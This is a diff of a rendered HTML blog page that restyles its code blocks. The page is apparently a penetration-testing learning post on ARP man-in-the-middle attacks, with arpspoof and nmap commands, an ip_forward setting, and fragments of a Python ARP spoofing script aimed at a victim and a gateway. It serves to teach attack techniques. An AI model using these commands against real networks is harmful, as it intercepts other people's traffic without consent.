@@ -26,7 +26,7 @@
   <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
   
-    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/vs-2015.min.css" />
   
 
   
@@ -188,14 +188,14 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h3 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h3><pre><code class="hljs python"><span class="hljs-comment"># author: huangyuhui</span>
+              <h3 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># author: huangyuhui</span>
 <span class="hljs-comment"># date: november 25,2019</span>
 <span class="hljs-comment"># envir: 5.2.0-kali2</span>
 <span class="hljs-comment"># desc: the detailed steps and the simple codes about the dns attack</span>
-<span class="hljs-comment"># repo address: https://github.com/yubuntu0109/penetration-testing-learning</span></code></pre>
+<span class="hljs-comment"># repo address: https://github.com/yubuntu0109/penetration-testing-learning</span></code></pre></div>
 
 
-<h3 id="ARP-MitM-attack-with-the-tool-of-arpspoof"><a href="#ARP-MitM-attack-with-the-tool-of-arpspoof" class="headerlink" title="ARP MitM attack with the tool of arpspoof"></a>ARP MitM attack with the tool of arpspoof</h3><pre><code class="hljs python"><span class="hljs-string">'''
+<h3 id="ARP-MitM-attack-with-the-tool-of-arpspoof"><a href="#ARP-MitM-attack-with-the-tool-of-arpspoof" class="headerlink" title="ARP MitM attack with the tool of arpspoof"></a>ARP MitM attack with the tool of arpspoof</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-string">'''
 &gt;&gt; scan the targete ip
 nmap -sP 192.168.xxx.*
 
@@ -207,10 +207,10 @@ arpspoof -i wlan0 -t 192.168.xxx.xxx(gatewayIP) 192.168.xxx.xxx(targetIP)
 
 &gt;&gt; traffic forwarding: forward the data package to the gateway
 echo 1 &gt;/proc/sys/net/ipv4/ip_forward
-'''</span></code></pre>
+'''</span></code></pre></div>
 
 
-<h3 id="ARP-Man-in-the-middle-attack-with-python"><a href="#ARP-Man-in-the-middle-attack-with-python" class="headerlink" title="ARP Man-in-the-middle attack with python"></a>ARP Man-in-the-middle attack with python</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
+<h3 id="ARP-Man-in-the-middle-attack-with-python"><a href="#ARP-Man-in-the-middle-attack-with-python" class="headerlink" title="ARP Man-in-the-middle attack with python"></a>ARP Man-in-the-middle attack with python</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
 <span class="hljs-keyword">import</span> time
 <span class="hljs-keyword">import</span> optparse
 <span class="hljs-keyword">import</span> subprocess
@@ -249,7 +249,7 @@ print((<span class="hljs-string">"[x]:the traffic forwarding hasn't opened"</spa
 <span class="hljs-comment"># run: python arpspoofing.py -v &lt;victim ip&gt; -g &lt;gateway ip&gt;</span>
 <span class="hljs-comment"># test: see the effects by the tool of driftnet : driftnet -v -b -i wlan0(interface name)</span>
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
-	main()</code></pre>
+	main()</code></pre></div>
 
 
 <h3 id="moments"><a href="#moments" class="headerlink" title="moments"></a>moments</h3><p><em>😅 a simple arp spoofing~</em></p>
